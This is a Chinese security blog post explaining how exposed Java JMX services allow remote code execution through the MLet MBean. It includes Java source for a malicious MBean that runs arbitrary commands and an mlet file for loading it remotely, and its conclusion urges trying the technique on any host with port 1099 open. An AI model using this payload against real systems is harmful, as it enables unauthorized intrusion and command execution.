##  **前言：**

 **前一段时间apace solr
JMX因为配置不当出现远程代码执行漏洞，最近自己在看一套java系统时，发现该系统也存在JMX远程代码漏洞，于是乎就想研究下JMX这种通用型漏洞，下面我就从原理到利用对该漏洞做一个简单的梳理。**

##  **一、** **JMX** **服务和MBean**

JMX（Java Management
Extensions，即Java管理扩展）是一个为应用程序、设备、系统等[植入](https://baike.baidu.com/item/%E6%A4%8D%E5%85%A5/7958584)管理功能的框架。JMX是一套复杂的机制，由于我们要讲的JMX远程代码漏洞和MBean相关，所以这里我们之介绍jmx和mbean相关的一些基础知识。

JMX是管理扩展，通过JMX我们可以监控管理我们的指定的java程序。但不是所有的java类都能被管理。只有按照特定格式编写的java类才能被jmx原理。这种特定格式机制我们称为Mbean。

我们先看一个简单的MBean，mbean首先需要定义一个接口，定义格式xxxMBean,

之后再定义一个实现该接口的类。

![](https://image.3001.net/images/20200323/1584893101_5e778cad32298.png!small)

![](https://image.3001.net/images/20200323/1584893112_5e778cb86bb07.png!small)

##  **二、** **MBeanServer**

对于已经实现的MBean，我们怎么进行监控和管理，这里就需要MBeanServer了。我们可以将MBeanServer理解为一个mbean的仓库，需要监控的mbean都需要先注册到仓库中。向MBeanServer注册mbean有两种方式，一是本地注册，二是远程注册（远程注册就为我们执行任意代码提供了可能，后面会细讲）。

我们先看一段简单的代码，本地向mbeanserver注册mbean。

    
    
    public static void main(String[] args) throwsException{
    MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
    //向MBeanServer 注册 mbean
    ObjectName helloName = new ObjectName("HelloMbean:name=Hello");
    mBeanServer.registerMBean(new Hello(), helloName);
    Registry registry = LocateRegistry.createRegistry(1099);
    //构造 JMXServiceURL
    JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi");
    JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
    jmxConnectorServer.start();
    System.out.println("JMXConnectorServer is running");}

运行程序，使用jconsole链接127.0.0.1:1099，可以看到我们的HelloMBean,也可以执行Hello()函数。

![](https://image.3001.net/images/20200323/1584893220_5e778d240cfb1.png!small)整个过程代码实现如下：

    
    
    static void JMXClient() throws Exception{     JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi");     JMXConnector jmxConnector = JMXConnectorFactory.connect(url,null);     MBeanServerConnection mBeanServerConnection = jmxConnector.getMBeanServerConnection();     ObjectName mbeanName = new ObjectName("HelloMbean:name=Hello");     //通过反射机制执行Hello中的hello()方法     mBeanServerConnection.invoke(mbeanName, "Hello", null, null); }

我们可以在代码中执行MBean中的方法。

##  **三、** **一个特殊的Mbean** **之MLet**

前面我们知道了mbean是什么东西，这里我们需要认识一个特殊的mbean叫MLet。

这是一个系统自带的mbean。我们简单看下其定义。

    
    
    /**  * Exposes the remote management interface of the MLet  * MBean.  */ public interface MLetMBean   {
    
    
    public class MLet extends java.net.URLClassLoader
    implements MLetMBean, MBeanRegistration, Externalizable { private static final long serialVersionUID = 3636148327800330130L;/** * The reference to the MBean server.*/ private MBeanServer server = null;

**![](https://image.3001.net/images/20200323/1584893491_5e778e33ce07b.png!small)**

简单理解就是，我们可以通过Mlet加载一个远程服务器上的MBean，并且没有对远程的mbean做合法性检测。

Mlet定义了一个函数getMBeanFromURL，用来加载并实例化远程的Mbean。

![](https://image.3001.net/images/20200323/1584893514_5e778e4add9db.png!small)

至于getMBeanFromURL怎么加载远程mbean，加载哪个mbean。需要mlet来规定。

上面规定了mlet的格式，下面我们简单看下几个必须字段的含义。

CODE = class

此属性指定了要获取的 MBean 的Java 类的全名，包括包名称。

ARCHIVE = " archiveList "

此属性是必需的，它指定了一个或多个 .jar 文件，这些文件包含要获取的MBean 使用的 MBean 或其他资源。

NAME = mbeanname

当 m-let 已注册MBean 实例时，此可选属性指定了要分配给MBean 实例的对象名称。如果mbeanname 以冒号字符(:)
开始，则对象名称的域部分是 MBean 服务器的默认域，可由
[MBeanServer.getDefaultDomain()](https://tool.oschina.net/uploads/apidocs/jdk-zh/javax/management/MBeanServer.html#getDefaultDomain\(\))返回。

##  **四、** **使用Melt** **加载远程MBean**

上一节我们简单介绍了下MLet，这节介绍下怎么加载远程的MBean

下面我们先实现一个恶意的MBean，并将其打包成JMXPayload.jar。

    
    
    public interface PayloadMBean {     public String runCmd(String cmd) throws IOException, InterruptedException; } public class Payload implements PayloadMBean {     @Override     public String runCmd(String cmd) throws IOException,InterruptedException {         Runtime runtime = Runtime.getRuntime();         Process process = runtime.exec(cmd);         BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));         BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));         String stdout_data = "";         String strtmp;         while ((strtmp = stdInput.readLine()) != null) {             stdout_data += strtmp + "\n";         }         while ((strtmp = stdError.readLine()) != null) {             stdout_data += strtmp + "\n";         }         process.waitFor();         return stdout_data;     } }

构造mlet文件

<mlet code=Payload archive= JMXPayload.jar name=:name=Payload></mlet>

将mlet和JMXPayload.jar放在web下同一个目录中。

**![](https://image.3001.net/images/20200323/1584893643_5e778ecb5c55a.png!small)**

先使用registerMBean向MBeanServer注册Mlet，然后使用getMBeanFromURL函数加载远程的PayloadMBean。

运行程序，使用jsonsole连接127.0.0.1:1099

##
![](https://image.3001.net/images/20200323/1584893658_5e778edaaf4a0.png!small)**五、**
**向远程的MBeanServer** **注册mbean**

前几节介绍的向MBeanServer注册mbean都是在server端完成的，那如何在client端向远程的MBeanServer注册mbean呢。

我们先实现一个默认的MBeanServer，没有向其注册我们的mbean。

![](https://image.3001.net/images/20200323/1584893698_5e778f0245040.png!small)

本地我们可以通过MBeanServer.RegisterMBean注册mbean

远端我们可以通过MBeanServerConnection.createMBean注册mbean

客户端代码：

![](https://image.3001.net/images/20200323/1584893726_5e778f1e41619.png!small)

Jconsole查看结果如下，Mlet已经被注册：

![](https://image.3001.net/images/20200323/1584893740_5e778f2c7ff13.png!small)然后通过getMBeansFromURL加载我们的恶意Mbean,执行结果如下：

![](https://image.3001.net/images/20200323/1584893754_5e778f3a9ef28.png!small)

然后可以通过payload执行任意代码

![](https://image.3001.net/images/20200323/1584893767_5e778f4782d18.png!small)当然这个jsonsole执行代码这个流程可以使用代码实现，有兴趣的可以自己研究下。

##  **六、总结**

至此，JMX漏洞的整理利用流程就结束了。我们再重新梳理下过程。

>
> 首先是MBeanServer提供了一套远程注册MBean的机制，让我们能够在本地向远端注册MBean。这个问题不大，因为我们不能注册自己写的mbean，只能注册远端服务器上已经有的mbean。巧的是jdk自己就有一些mbean，其中有一个mbean叫mlet。
>
>
> Mlet是实现了一个函数getMBeansFromURL(url),这个函数能够加载并实例化我们指定的远程mbean，从而导致了我们的恶意payloadMBean被加载注册到MBeanServer上，导致任意命令执行。
>
> JMX漏洞是一个通用型漏洞，如果遇到java系统开启1099端口，或者开启jmx的都可以使用该漏洞测试一下，惊喜就在意外中。

##  参考：

>
> <https://www.apiref.com/java11-zh/java.management/javax/management/loading/MLet.html>
>
> <https://www.anquanke.com/post/id/194126>

***本文原创作者：MrCoding，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

